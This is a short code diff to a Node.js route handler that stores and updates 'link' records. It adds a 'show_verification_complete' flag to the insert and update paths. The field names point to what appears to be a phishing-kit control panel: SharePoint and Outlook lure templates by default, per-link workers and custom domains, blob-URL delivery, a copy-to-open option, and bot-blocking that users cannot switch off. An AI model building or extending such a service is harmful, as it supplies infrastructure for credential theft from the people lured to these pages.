@@ -122,7 +122,7 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
       name, worker_name, template_type, verification_design, auth_mode,
       destination_url, custom_domain, url_type, domain_connection, route_name,
       file_name, pages, title_text, message_text, button_text,
-      background_blur, blob_url_enabled, copy_to_open, custom_bg_url,
+      background_blur, blob_url_enabled, copy_to_open, show_verification_complete, custom_bg_url,
     } = req.body;
 
     // Anti-bot protection is always enabled — users cannot disable it
@@ -162,8 +162,8 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
       (user_id, name, worker_name, template_type, verification_design, auth_mode,
       destination_url, custom_domain, url_type, domain_connection, route_name,
       file_name, pages, title_text, message_text, button_text,
-      background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+      background_blur, blob_url_enabled, copy_to_open, show_verification_complete, turnstile_enabled, custom_bg_url)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
       [
         req.user.id, name || generatedName, uniqueWorkerName, template_type || 'sharepoint4',
         verification_design || 'outlook', auth_mode || 'token',
@@ -171,7 +171,8 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
         url_type || 'worker', domain_connection || 'subdomain', route_name || null,
         file_name || null, pages || null, title_text || null, message_text || null, button_text || null,
         background_blur || 4, blob_url_enabled ? 1 : 0,
-        copy_to_open ? 1 : 0, turnstile_enabled !== false ? 1 : 0,
+        copy_to_open ? 1 : 0, show_verification_complete !== false ? 1 : 0,
+        turnstile_enabled !== false ? 1 : 0,
         custom_bg_url || null,
       ]
     );
@@ -259,7 +260,7 @@ router.put('/:id', userAuth, commonValidators.updateLink, validateResult, async 
       'name', 'template_type', 'verification_design', 'auth_mode',
       'destination_url', 'custom_domain', 'url_type', 'domain_connection', 'route_name',
       'file_name', 'pages', 'title_text', 'message_text', 'button_text',
-      'background_blur', 'blob_url_enabled', 'copy_to_open', 'status', 'custom_bg_url',
+      'background_blur', 'blob_url_enabled', 'copy_to_open', 'show_verification_complete', 'status', 'custom_bg_url',
     ];
 
     const updates = {};
@@ -274,7 +275,7 @@ router.put('/:id', userAuth, commonValidators.updateLink, validateResult, async 
     }
 
     const setClauses = Object.keys(updates).map(k => {
-      if (['blob_url_enabled', 'copy_to_open'].includes(k)) {
+      if (['blob_url_enabled', 'copy_to_open', 'show_verification_complete'].includes(k)) {
         return `${k} = ${updates[k] ? 1 : 0}`;
       }
       return `${k} = ?`;
